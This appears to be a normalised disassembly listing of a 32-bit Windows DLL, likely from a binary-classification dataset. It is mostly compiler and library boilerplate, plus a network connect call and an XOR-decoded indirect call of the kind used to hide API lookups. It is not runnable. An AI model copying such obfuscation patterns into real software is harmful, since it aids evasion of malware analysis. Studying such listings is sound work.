xor edi edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] edi
cmp eax edi
jne r-xdata
cmp ecx edi
jne r-xdata
lea esi [ ebp - 0x14 ]
call sub_1002b580
lea eax [ edi + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] edi
jne r-xdata
lea esi [ ebp - 0x14 ]
call sub_1002b580
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x14 ]
call sub_10062be0
test eax eax
je r-xdata
lea esi [ ebp - 0x14 ]
call sub_1002b580
mov eax 0x3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
lea ebx [ esi + eax * 4 ]
cmp esi ebx
je r-xdata
lea esi [ ebp - 0x14 ]
call sub_1002b580
mov eax 0x6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x14 ]
call sub_1002b580
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0xa
jae r-xdata
mov ecx [ esi ]
mov edx [ ebp + 0xc ]
push ecx
push edx
mov ecx 0x104
call sub_10017c80
test eax eax
jne r-xdata
lea esi [ ebp - 0x14 ]
call sub_1002b580
mov eax 0x7
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add [ ebp + 0xc ] 0x208
add esi 0x4
inc edi
cmp esi ebx
jne r-xdata
sub_10045f0b
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_10027f5a
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10045f32
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10012a74
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10045fcf
push 0x4c
mov eax sub_10085e7f
call sub_1003fae8
mov edi [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
mov ebx [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
inc eax
call sub_1004642f
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp - 0x34 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10042ed5
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] 0x1
jb r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x58 ]
call sub_1001c8b0
push eax
lea ecx [ ebp - 0x58 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x30 ] 0x3
mov [ esi ] r--data
call sub_100554b0
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x30 ] al
je r-xdata
sub_10046090
push ebp
mov ebp esp
push 0xffffffff
push sub_10084f8b
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x18 ]
mov ecx [ ecx ]
push 0x1
push eax
mov eax [ ebp + 0x14 ]
push 0x3
push edx
mov edx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push edx
push eax
push ecx
call [ InternetConnectW@IAT ]
xor edx edx
mov esi eax
test esi esi
setne dl
push edx
call sub_1002cbe0
add esp 0x4
test esi esi
je r-xdata
xor eax eax
push 0x4
call sub_1001f84c
add esp 0x4
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push esi
mov ecx eax
call sub_1004a0f0
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_10046140
push esi
mov esi eax
mov eax [ esi + 0x4 ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x20 ] 0x0
je r-xdata
push eax
call edi
mov esi [ esi ]
test esi esi
je r-xdata
mov [ esi + 0x20 ] 0x0
pop edi
pop esi
retn
push esi
call edi
sub_1004618b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
push 0x16
pop eax
pop ebp
retn
sub_100461c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push esi
lea eax [ esp + 0x8 ]
push eax
mov esi ecx
call sub_10024a46
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x10 ] ecx
mov edx [ eax + 0xc ]
add esp 0x4
mov [ esi + 0x14 ] edx
call sub_10059d69
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10046210
push ebp
mov ebp esp
push 0xffffffff
push sub_1008668f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
mov edi [ GetProcessHeap@IAT ]
xor ebx ebx
push 0x4
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x14 ] eax
push ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] ebx
push ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x34 ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
lea edi [ esi + 0x38 ]
push ebx
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ eax ]
jne r-xdata
mov edx [ edi + 0x4 ]
dec [ edx ]
cmp [ edx ] ebx
jne r-xdata
mov [ edi + 0x4 ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_1000be60
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
inc [ eax ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x5
cmp edi edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp ecx ebx
je r-xdata
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
inc [ eax ]
mov edx [ edi ]
cmp edx ebx
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax [ ebp - 0x14 ]
mov edx [ edi + 0x4 ]
cmp edx ebx
je r-xdata
mov eax [ edx ]
mov ecx edx
mov edx [ eax ]
push 0x1
call edx
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
push edx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
sub_100463af
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_10045d3b
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_100463f0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x14 ]
test eax eax
js r-xdata
push edi
push 0x30
push esi
call sub_1006ee90
mov edx [ esi + 0x4 ]
add edx 0x8
push edx
mov edi eax
push edi
push esi
call sub_10046530
add esp 0x14
mov eax edi
pop edi
pop esi
pop ebp
retn
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0xc ] eax
jb r-xdata
xor eax eax
pop esi
pop ebp
retn
sub_10046440
push ebp
mov ebp esp
sub esp 0x420
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x104
lea eax [ ebp - 0x210 ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
call sub_1001ce10
lea ecx [ ebp - 0x210 ]
push ecx
call sub_10023520
lea edx [ ebp - 0x210 ]
add esp 0x4
push edx
call sub_1002f2c0
lea eax [ ebp - 0x210 ]
add esp 0x4
push eax
call sub_1002d900
lea ecx [ ebp - 0x210 ]
add esp 0x4
push ecx
call sub_1002d260
mov eax [ rw-data ]
add esp 0x4
test eax eax
je r-xdata
call sub_1002dcb0
lea ecx [ ebp - 0x418 ]
push ecx
push 0x104
call [ GetCurrentDirectoryW@IAT ]
lea edx [ ebp - 0x418 ]
push edx
call [ PathAddBackslashW@IAT ]
lea edx [ ebp - 0x418 ]
call sub_10038670
push 0x0
call [ ExitProcess@IAT ]
int3
push eax
call [ ReleaseMutex@IAT ]
mov edx [ rw-data ]
mov al 0x38
mov [ ebp - 0x41c ] edx
xor [ ebp - 0x41c ] al
xor [ ebp - 0x41b ] al
xor [ ebp - 0x41a ] al
xor [ ebp - 0x419 ] al
mov eax [ rw-data ]
push eax
call [ ebp - 0x41c ]
sub_10046530
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
call sub_100791c0
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov edx [ ebp + 0xc ]
mov [ ecx + eax * 4 ] edx
inc [ esi + 0x4 ]
pop esi
pop ebx
pop ebp
retn
sub_10046560
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a24c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x178
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov esi edx
cmp [ esi + 0x8 ] 0x0
mov [ ebp - 0x184 ] eax
mov [ ebp - 0x180 ] ecx
jne r-xdata
push ebx
call sub_1004b9e0
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
xor edx edx
mov [ ebp - 0x130 ] 0x7
mov [ ebp - 0x134 ] 0x0
mov [ ebp - 0x144 ] dx
lea edx [ ebp - 0x144 ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call sub_10027fc0
test eax eax
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax 0xe2
call sub_10045930
push edx
lea eax [ ebp - 0x160 ]
lea ebx [ esi + 0xc ]
push eax
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0xd
mov [ ebp - 0x4 ] 0x0
call sub_100205a0
cmp [ ebp - 0x14c ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x184 ]
push ecx
mov ecx [ ebp - 0x180 ]
push edi
lea edx [ ebp - 0x144 ]
call sub_10003c30
test eax eax
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x8f
call sub_10045930
mov eax edx
push eax
lea ecx [ ebp - 0x160 ]
lea ebx [ esi + 0xc ]
push ecx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0xd
mov [ ebp - 0x4 ] 0x2
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x14c ] esi
jb r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x160 ]
push ecx
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0x144 ]
call sub_10019100
xor eax eax
lea edx [ ebp - 0x98 ]
mov eax 0x8d
call sub_10045930
push edx
lea eax [ ebp - 0x17c ]
lea ebx [ esi + 0xc ]
push eax
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0xd
mov [ ebp - 0x4 ] 0x3
call sub_100205a0
lea ecx [ ebp - 0x17c ]
call sub_10019100
lea ecx [ ebp - 0x144 ]
call sub_10019100
mov eax 0x4
jmp r-xdata
cmp [ ebp - 0x130 ] esi
jb r-xdata
mov edx [ ebp - 0x160 ]
push edx
call sub_100187af
add esp 0x4
mov eax 0x3
jmp r-xdata
mov eax [ ebp - 0x144 ]
push eax
call sub_100187af
add esp 0x4
sub_1004675f
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x8c ]
call sub_1006c82b
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1005c1c5
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_1003fd35
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x1c
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ ebp - 0x88 ]
fld [ ebp + 0x1c ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
mov [ ebp - 0x79 ] 0x0
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_10046920
push ebp
mov ebp esp
push 0xffffffff
push sub_10086bd7
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0xffffffff
lea ecx [ esi + 0x4 ]
xor edi edi
mov [ esi ] r--data
push edi
mov ebx 0x7
xor eax eax
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push edx
mov [ ecx ] ax
call sub_100404a0
mov ax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
mov [ esi + 0x20 ] ax
mov eax [ ebp + 0x10 ]
push 0xffffffff
lea ecx [ esi + 0x24 ]
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_100404a0
mov eax [ ebp + 0x14 ]
push 0xffffffff
lea ecx [ esi + 0x40 ]
mov [ ebp - 0x4 ] 0x1
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_100404a0
mov eax [ ebp + 0x18 ]
push 0xffffffff
lea ecx [ esi + 0x5c ]
mov [ ebp - 0x4 ] 0x2
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_100404a0
mov eax [ ebp + 0x1c ]
push 0xffffffff
lea ecx [ esi + 0x78 ]
mov [ ebp - 0x4 ] 0x3
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_100404a0
mov eax [ ebp + 0x20 ]
push 0xffffffff
lea ecx [ esi + 0x94 ]
mov [ ebp - 0x4 ] 0x4
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_100404a0
mov ecx [ ebp + 0x24 ]
mov edx [ ebp + 0x28 ]
mov [ esi + 0xb0 ] ecx
mov [ esi + 0xb4 ] edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_10046a34
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100142d4
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10046ae0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088568
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
xor edi edi
mov ebx ecx
mov [ ebp - 0x5c ] ebx
cmp eax edi
je r-xdata
xor eax eax
lea ecx [ ebp - 0x54 ]
push ecx
push eax
mov [ ebp - 0x54 ] edi
call [ CommandLineToArgvW@IAT ]
mov esi [ ebp - 0x54 ]
mov [ ebp - 0x4c ] eax
cmp esi edi
jne r-xdata
mov eax ebx
lea edx [ eax + 0x2 ]
cmp eax edi
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
inc eax
mov [ ebp - 0x58 ] eax
test esi esi
jg r-xdata
push eax
push edi
jmp r-xdata
xor edx edx
mov eax ebx
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov eax [ ebp - 0x4c ]
test eax eax
je r-xdata
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push ebx
lea ecx [ ebp - 0x2c ]
call sub_1005ddc0
lea eax [ ebp - 0x2c ]
push eax
mov edx r--data
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_1001ccb0
mov esi 0x8
add esp 0x4
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
push 0x0
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x4c ]
push ecx
push eax
mov eax [ edx + edi * 4 ]
push eax
call sub_1005feb0
add esp 0xc
test eax eax
sete bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_100187af
add esp 0x4
test bl bl
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
inc edi
cmp edi [ ebp - 0x54 ]
jl r-xdata
mov ecx [ ebp - 0x4c ]
mov edx [ ecx + edi * 4 ]
mov ebx [ ebp - 0x58 ]
lea eax [ edx + ebx * 2 ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov ebx [ ebp - 0x5c ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
jne r-xdata
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x50 ] edi
mov ecx [ ebp - 0x50 ]
mov eax [ eax + ecx * 4 ]
lea edi [ ebx + ebx ]
add eax edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ebx [ GetProcessHeap@IAT ]
sub eax edx
sar eax 0x1
lea edx [ eax + eax + 0x2 ]
push edx
push esi
call ebx
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x50 ]
mov esi eax
mov eax [ ebp - 0x4c ]
mov ecx [ eax + ecx * 4 ]
add ecx edi
mov eax ecx
lea edi [ eax + 0x2 ]
lea ebx [ ebx ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax edi
sar eax 0x1
add eax eax
push eax
push ecx
push esi
call sub_1007f5d0
mov ecx [ ebp - 0x4c ]
add esp 0xc
push ecx
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
sub_10046d02
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_10007b46
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1006299d
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10046e20
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_1000831a
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1000831a
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
